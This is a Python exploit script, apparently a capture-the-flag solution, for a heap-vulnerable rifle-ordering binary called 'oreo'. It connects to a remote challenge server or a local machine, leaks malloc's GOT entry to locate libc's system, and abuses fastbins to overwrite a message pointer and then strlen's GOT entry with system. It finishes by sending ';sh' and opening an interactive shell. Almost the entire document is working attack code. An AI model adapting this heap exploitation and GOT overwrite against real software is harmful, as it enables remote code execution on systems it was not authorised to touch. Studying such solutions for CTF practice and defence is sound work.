#!/usr/bin/python
# -*- coding: utf-8 -*-
# socat TCP-LISTEN:1414,reuseaddr,fork exec:'./oreo_35f118d90a7790bbd1eb6d4549993ef0',pty,ctty &
import sys, struct, socket, telnetlib
 
def sock(remoteip, remoteport):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((remoteip, remoteport))
  return s, s.makefile('rw', bufsize=0)
 
def read_until(f, delim='\n'):
  data = ''
  while not data.endswith(delim):
    data += f.read(1)
  return data
 
def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
 
def shell(s):
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()
 
def _read2menu():
  r = read_until(f, "Action: ")
  return r
 
def _add(name, desc):
  global counter
  counter+=1
  print "add", counter
  f.write("1\n")
  read_until(f, 'Rifle name: ')
  f.write(name + "\n")
  read_until(f, 'Rifle description: ')
  f.write(desc + "\n")
  _read2menu()
 
def _show():
  f.write("2\n")
  read_until(f, "Rifle to be ordered:")
  return _read2menu()
 
def _order():
  f.write("3\n")
  _read2menu()
 
def _msg(text, noread=False):
  f.write("4\n")
  read_until(f, "Enter any notice you'd like to submit with your order: ")
  f.write(text + "\n")
  if noread == False:
    _read2menu()
 
def _showst():
  f.write("5\n")
  _read2menu()
 
malloc_got = 0x0804A244
strlen_got = 0x0804A250
counter = 0
 
# start
if sys.argv[1] == 'r':
  s, f = sock("wildwildweb.fluxfingers.net", 1414)
  # In this challenge, author maybe use custom libc in the server.
  # Because I tried offset info from all libc I had, but it was fail...
  # Finally, for getting offset info, I used latest gentoo stage3 tarball.
  # I assumeed that author built from latest libc source.
  # Gentoo's stage3 may be built from latest(?) source too, and published in the www.
  # I downloaded and extracted libc from it, applied offset info, and got shell.
  offset_system = 0x00042af0
  offset_malloc = 0x0007d950
else:
  s, f = sock("192.168.164.133", 1414)
  #offset_system = 0x00040100
  offset_system = 0x000400fa
  offset_malloc = 0x00076f40
_read2menu()
 
# address read
print "[+] leak malloc@got"
_add(name="A"*27 + p(malloc_got-0x19), desc="B"*25)
libc_malloc = u(_show().split('Name: ')[2][:4])
libc_system = libc_malloc - offset_malloc + offset_system
print "malloc:", hex(libc_malloc)
print "system:", hex(libc_system)
 
for i in xrange(0x3c):
  _add(name="A"*27 + p(0), desc="B")
_add(name="A", desc="B")
_order() # push fastbins N=2
 
# overwrite p_order_msg
_add(name="A"*27 + p(0) + p(0x9) + p(0x41) + p(0x0804A2A4-4), desc="B") # overwrite
_add(name="A"*27 + p(0), desc="B") # unlink # push dummy fastbins
_add(name="AAAA", desc=p(strlen_got)) # malloc then overwrite p_order_msg
 
# overwrite strlen@got
_msg(text=p(libc_system) + ";sh\x00", noread=True)
 
print "got shell :)"
shell(s)
